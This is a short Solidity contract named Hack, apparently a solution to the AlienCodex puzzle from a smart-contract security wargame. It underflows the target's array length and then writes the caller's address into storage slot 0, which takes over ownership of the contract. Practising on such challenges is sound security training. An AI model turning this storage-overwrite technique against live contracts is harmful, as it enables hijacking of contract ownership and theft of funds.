// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./AlienCodex.sol";

contract Hack {
    constructor(AlienCodex target) {
        target.make_contact();
        target.retract();

        uint256 h = uint256(keccak256(abi.encode(uint256(1))));
        uint256 i;

        unchecked {
            i -= h;
        }

        target.revise(i, bytes32(uint256(uint160(msg.sender))));
    }
}
